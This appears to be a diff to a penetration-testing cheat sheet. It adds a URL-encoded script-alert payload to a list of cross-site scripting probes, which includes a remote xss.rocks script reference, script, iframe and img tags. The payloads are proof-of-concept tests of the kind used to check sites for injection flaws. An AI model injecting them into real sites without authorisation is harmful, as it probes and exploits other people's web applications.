@@ -133,6 +133,7 @@ Wordpress =>
 #XSS
 http://xss.rocks/xss.js
 <script>alert("test");</script>
+%3cscript%3ealert%28123%29%3c%2fscript%3e
         <iframe src=http://></iframe>
 	**DOM BASED XSS**
 		<img src="" />
